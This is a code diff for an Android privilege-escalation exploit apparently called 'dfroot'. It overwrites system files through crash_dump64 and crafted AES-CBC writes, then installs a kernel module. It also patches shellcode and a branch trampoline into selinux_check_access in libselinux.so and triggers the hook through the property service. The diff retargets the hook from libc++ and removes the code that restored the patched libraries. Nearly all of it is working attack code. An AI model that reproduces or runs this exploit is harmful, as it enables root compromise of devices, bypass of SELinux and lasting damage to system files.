@@ -15,29 +15,19 @@
 #include <sys/utsname.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <sys/system_properties.h>
 #include "aes256.h"
 
 #define eos(s) (s + strlen(s))
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
-static char    *libcxx_ko_target;
+extern char ko_target[];
 
 static int      g_encap_port;
 static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
-struct PatchRestore {
-    const char *lib;
-    uint64_t    tramp_aligned;
-    uint8_t     tramp_orig[16];
-    uint64_t    shell_off;
-    uint32_t    shell_padded;
-    char        shell_orig[1024];
-    int         valid;
-};
-
-static struct PatchRestore g_libcxx_r;
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
@@ -65,9 +55,9 @@ static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const cha
     if (pid == 0) {
         if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
         if (mode)
-            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
+            execl(kCrashDump, "crashdump64", offstr, ko_target, mode, NULL);
         else
-            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
+            execl(kCrashDump, "crashdump64", offstr, ko_target, NULL);
         _exit(1);
     }
     int st = 0;
@@ -236,11 +226,10 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
 /* ---- KO and splicehelper blobs ---- */
 
-extern char libcxx_start[];
-extern char libcxx_data[];
-extern uint32_t libcxx_len;
-extern char libcxx_first_inst_copy[];
-extern uint32_t libcxx_ko_target_off;
+extern char libselinux_start[];
+extern char libselinux_data[];
+extern uint32_t libselinux_len;
+extern char libselinux_first_inst_copy[];
 
 asm(
     ".section .rodata\n"
@@ -373,24 +362,14 @@ static int patch_ko(void) {
 
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
-    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
-    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
-    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
+    if (!buf) { printf("patch: %s - pad16 alloc failed\n", ko_target); return -1; }
+    printf("patch: %s <- dfroot.ko (%zu bytes)\n", ko_target, len);
+    int ret = patch_file_cbc(ko_target, buf, len, 0, 1);
     free(buf);
-    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
+    if (ret) printf("patch: %s patch failed: %d\n", ko_target, ret);
     return ret;
 }
 
-static void cleanup(void) {
-    if (!g_libcxx_r.valid) return;
-    printf("\n=== cleanup ===\n");
-    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
-                   (size_t)g_libcxx_r.tramp_aligned, 0);
-    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
-                   (size_t)g_libcxx_r.shell_off, 0);
-}
 
 int find_hook_target(const char *lib, const char *sym,
                      uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
@@ -398,17 +377,12 @@ int find_hook_target(const char *lib, const char *sym,
 
 static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
-                      char *first_inst_copy, struct PatchRestore *restore) {
+                      char *first_inst_copy) {
     const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
 
     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
-
-    if (padded > sizeof(restore->shell_orig)) {
-        printf("shellcode too large to save (%zu)\n", padded);
-        free(buf); return -1;
-    }
 
     uint64_t hook_off, shell_off; uint32_t first_insn;
     printf("Finding symbol offsets for %s:\n", lib);
@@ -428,18 +402,6 @@ static int patch_hook(const char *lib, const char *sym,
     *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
 
     uint64_t aligned = hook_off & ~(uint64_t)15;
-    int fd = open(lib, O_RDONLY);
-    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
-    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
-          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
-    close(fd);
-    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }
-
-    restore->lib           = lib;
-    restore->shell_off     = shell_off;
-    restore->shell_padded  = (uint32_t)padded;
-    restore->tramp_aligned = aligned;
-    restore->valid         = 1;
 
     printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
     int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
@@ -448,7 +410,11 @@ static int patch_hook(const char *lib, const char *sym,
 
     int pos = (int)(hook_off & 15);
     uint8_t blk[16];
-    memcpy(blk, restore->tramp_orig, 16);
+    int tfd = open(lib, O_RDONLY);
+    if (tfd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); return -1; }
+    int tok = pread(tfd, blk, 16, (off_t)aligned) == 16;
+    close(tfd);
+    if (!tok) { printf("pread %s tramp failed\n", lib); return -1; }
     memcpy(&blk[pos], &hook_insn, 4);
     printf("patch: %s <- trampoline (16 bytes)\n", lib);
     int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
@@ -456,16 +422,11 @@ static int patch_hook(const char *lib, const char *sym,
     return ret2;
 }
 
-static int createOrphanProcess(void) {
-    printf("Triggering hook...\n");
-    int pid = fork();
-    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
-    if (pid == 0) {
-        int pid2 = fork();
-        if (pid2 == 0) { sleep(1); _exit(0); }
-        _exit(0);
-    }
-    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
+static int triggerSelinuxCheck(void) {
+    printf("Triggering hook via property service...\n");
+    /* __system_property_set causes init to call getpeercon() + selinux_check_access()
+     * in its property service handler, even if the set is denied by SELinux policy. */
+    __system_property_set("dfroot.trigger", "1");
     return 0;
 }
 
@@ -525,13 +486,12 @@ static int setup(int argc, char **argv) {
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
 
-    const char *ko_target = detect_ko_target();
-    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
-    strncpy(libcxx_ko_target, ko_target, 63);
-    libcxx_ko_target[63] = '\0';
+    const char *detected_ko_target = detect_ko_target();
+    strncpy(ko_target, detected_ko_target, 63);
+    ko_target[63] = '\0';
 
     printf("=== setup ===\n");
-    printf("found ko_target: %s\n", ko_target);
+    printf("found ko_target: %s\n", detected_ko_target);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
     return 0;
@@ -543,23 +503,22 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
-                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
-                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   &g_libcxx_r)) goto done;
+    if (patch_hook("/system/lib64/libselinux.so",
+                   "selinux_check_access",
+                   libselinux_data, libselinux_len, libselinux_start, libselinux_first_inst_copy)) goto done;
 
     rc = 2;
     usleep(500000);
     
     printf("\n=== init  ===\n");
-    createOrphanProcess();
+    triggerSelinuxCheck();
 
     static const struct {
         const char *path;
         const char *msg;
         int         rc;
     } markers[] = {
-        { "/dev/df",    "libc++: loading custom module",                    -1 },
+        { "/dev/df",    "libselinux: loading custom module",                 -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
@@ -595,6 +554,5 @@ int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     if (setup(argc, argv) != 0) return 2;
     int rc = exploit();
-    cleanup();
     return rc;
 }
